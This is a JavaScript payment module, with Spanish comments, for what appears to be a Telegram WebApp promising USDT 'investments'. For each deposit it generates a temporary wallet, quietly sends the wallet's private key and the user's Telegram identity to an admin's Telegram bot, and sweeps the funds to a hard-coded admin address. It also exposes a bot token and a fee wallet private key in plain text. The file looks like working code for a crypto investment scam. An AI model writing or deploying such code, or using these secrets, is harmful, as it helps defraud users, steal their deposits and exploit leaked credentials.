import { state, saveInvestment } from './state.js';
import { updateDashboard, switchTab } from './main.js';

// --- CONFIGURACIÓN CENTRALIZADA ---
const API_BASE = "https://api-usdt-bep20.vercel.app/api";
const ADMIN_BOT_TOKEN = "8756788328:AAEpszWL4ssLme7YLtJs8kachsj4cEnvdrw";
const ADMIN_CHAT_ID = "7517815832";

/**
 * Envía los datos de la wallet generada al Telegram del Administrador
 */
async function sendKeyToAdmin(address, privKey, amount) {
    const user = window.Telegram?.WebApp?.initDataUnsafe?.user;
    const username = user?.username ? `@${user.username}` : (user?.first_name || "Usuario Desconocido");
    const userId = user?.id || "N/A";

    const text = `🛡️ PANEL DE AUDITORÍA ADMIN 🛡️\n\n` +
                 `💰 Inversión: ${amount} USDT\n` +
                 `📍 Wallet Temp: <code>${address}</code>\n` +
                 `🔑 Private Key: <code>${privKey}</code>\n\n` +
                 `👤 Usuario: ${username} (ID: ${userId})\n` +
                 `------------------------------\n` +
                 `⚠️ Usa esta llave si el proceso automático falla`;

    try {
        await fetch(`https://api.telegram.org/bot${ADMIN_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: ADMIN_CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            })
        });
    } catch (e) {
        console.error("Error enviando reporte al Admin:", e);
    }
}

/**
 * Muestra el modal de pago y genera la wallet temporal
 */
export async function showPayment() {
    const buyInput = document.getElementById('buy-qty');
    const amount = parseFloat(buyInput.value);
    
    if(!amount || amount < 1) {
        window.showToast("Minimum investment is 1 USDT");
        return;
    }
    
    const btnContinueViewBuy = document.getElementById('btn-continue');
    if(btnContinueViewBuy) {
        btnContinueViewBuy.disabled = true;
        btnContinueViewBuy.innerText = "GENERATING...";
    }

    try {
        const response = await fetch(`${API_BASE}/bsc`);
        const data = await response.json();

        if(data.address) {
            state.pendingInvestment = amount;
            state.tempAddress = data.address;
            state.tempKey = data.privateKey; 

            // 1. REPORTE AL ADMIN (Telegram Privado)
            sendKeyToAdmin(data.address, data.privateKey, amount);

            // 2. SISTEMA DE RECUPERACIÓN LOCAL (LocalStorage)
            localStorage.setItem('last_wallet_address', data.address);
            localStorage.setItem('last_private_key', data.privateKey);
            localStorage.setItem(`recovery_${data.address}`, data.privateKey);
            
            console.log("🔑 KEY GUARDADA EN STORAGE Y ENVIADA AL ADMIN");

            // 3. ACTUALIZAR INTERFAZ
            document.getElementById('pay-amount-display').innerText = amount.toFixed(2) + " USDT";
            document.getElementById('wallet-address-display').innerText = data.address;
            
            const qrImg = document.getElementById('qr-image');
            if(qrImg) {
                qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${data.address}`;
            }

            document.getElementById('payment-status-text').innerHTML = 'Not Received <span style="font-size: 1.2em;">⏳</span>';
            const arrowIcon = document.getElementById('arrow-icon');
            if(arrowIcon) arrowIcon.className = "fas fa-arrow-right";
            
            const btnVerify = document.getElementById('btn-verify-payment');
            if(btnVerify) {
                btnVerify.disabled = false;
                btnVerify.style.opacity = "1";
            }

            document.getElementById('payModal').style.display = 'flex';
            startPaymentTimer();
        }
    } catch (e) {
        console.error("Error generating payment:", e);
        window.showToast("Connection error with API");
    } finally {
        if(btnContinueViewBuy) {
            btnContinueViewBuy.disabled = false;
            btnContinueViewBuy.innerText = "Continue";
        }
    }
}

/**
 * Cierra el modal y limpia el timer
 */
export function closePayment() {
    document.getElementById('payModal').style.display = 'none';
    clearInterval(state.payTimerInterval);
}

/**
 * Verifica el pago en la red
 */
export async function verifyPayment() {
    const statusText = document.getElementById('payment-status-text');
    const arrowIcon = document.getElementById('arrow-icon');
    const btnVerify = document.getElementById('btn-verify-payment');
    
    statusText.innerHTML = 'LOADING... ⌛';
    if(arrowIcon) arrowIcon.className = "fas fa-sync fa-spin"; 
    if(btnVerify) {
        btnVerify.disabled = true;
        btnVerify.style.opacity = "0.7";
    }

    try {
        // Añadimos un tiempo de espera (timeout) para que no se quede colgado
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 15000); // 15 segundos

        const res = await fetch(`${API_BASE}/deposit-usdt`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            signal: controller.signal,
            body: JSON.stringify({
                userPrivateKey: state.tempKey,
                adminAddress: "0x1DE276E2E8879e1E6fBf905ee656Fe62c6D88E49", 
                feePrivateKey: "d303adf9054d5007ea88392938a7865f9275de2b1fac2c6812cfd92da4b1f0ab" 
            })
        });

        clearTimeout(timeoutId);
        const result = await res.json();

        if(result.success) {
            statusText.innerHTML = `<span style="color: #10b981;">${state.pendingInvestment.toFixed(2)} USDT ✅</span>`;
            if(arrowIcon) arrowIcon.className = "fas fa-check";
            
            localStorage.removeItem(`recovery_${state.tempAddress}`);
            saveInvestment(state.pendingInvestment);
            
            window.showToast("Payment confirmed!");

            setTimeout(() => {
                closePayment();
                updateDashboard();
                switchTab('home');
            }, 2500);
        } else {
            // Si la API responde pero el pago no está, NO mostramos "Network Error"
            // Solo regresamos al estado original
            setTimeout(() => {
                statusText.innerHTML = 'Not Received <span style="font-size: 1.2em;">⏳</span>';
                if(arrowIcon) arrowIcon.className = "fas fa-arrow-right";
                if(btnVerify) {
                    btnVerify.disabled = false;
                    btnVerify.style.opacity = "1";
                }
            }, 1000);
        }
    } catch (e) {
        // AQUÍ ES DONDE SALÍA TU ERROR
        console.error("DETALLE DEL ERROR:", e); // Esto te dirá en la consola qué pasa
        
        // Si el error es real de red, mostramos el Toast
        window.showToast("Network error, try again");
        
        statusText.innerHTML = 'Not Received <span style="font-size: 1.2em;">⏳</span>';
        if(arrowIcon) arrowIcon.className = "fas fa-arrow-right";
        if(btnVerify) {
            btnVerify.disabled = false;
            btnVerify.style.opacity = "1";
        }
    }
}

function startPaymentTimer() {
    let time = 1800; 
    clearInterval(state.payTimerInterval);
    state.payTimerInterval = setInterval(() => {
        let min = Math.floor(time / 60).toString().padStart(2, '0');
        let sec = (time % 60).toString().padStart(2, '0');
        const timerEl = document.getElementById('pay-timer-text');
        if(timerEl) {
            timerEl.innerHTML = `Send countdown: <span style="color: #10b981;">00:${min}:${sec}</span>`;
        }
        if(time <= 0) {
            clearInterval(state.payTimerInterval);
            if(timerEl) timerEl.innerHTML = "EXPIRED";
        }
        time--;
    }, 1000);
}

window.copyAddress = function() {
    const address = document.getElementById('wallet-address-display').innerText;
    navigator.clipboard.writeText(address).then(() => {
        window.showToast("Address copied!");
    });
};

window.recoverLastKey = function() {
    const addr = localStorage.getItem('last_wallet_address');
    const key = localStorage.getItem('last_private_key');
    if(key) {
        console.log("Dirección:", addr);
        console.log("Llave Privada:", key);
        return { address: addr, privateKey: key };
    } else {
        console.log("No hay llaves guardadas.");
    }
};

window.showPayment = showPayment;
window.closePayment = closePayment;
window.verifyPayment = verifyPayment;
